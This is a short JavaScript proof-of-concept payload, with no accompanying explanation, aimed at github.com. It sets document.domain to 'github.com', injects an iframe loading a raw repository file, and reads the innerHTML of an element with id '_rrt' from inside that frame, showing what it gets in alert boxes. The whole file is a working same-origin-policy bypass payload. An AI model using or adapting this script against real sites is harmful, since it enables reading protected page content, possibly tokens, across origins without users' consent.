alert('probe:'+document.domain+' '+document.location.href);

document.domain="github.com";

document.write("<iframe id='if' src='http://github.com/gojomo/scratch/raw/master/friendlyframe.html'></iframe><scr"+"ipt>alert('second:'+document.domain+' '+document.location.href);function doit(){alert(document.getElementById('if').contentWindow.document.getElementById('_rrt').innerHTML)}</script><a href='javascript:doit();' onclick='doit()'>doit</a>");

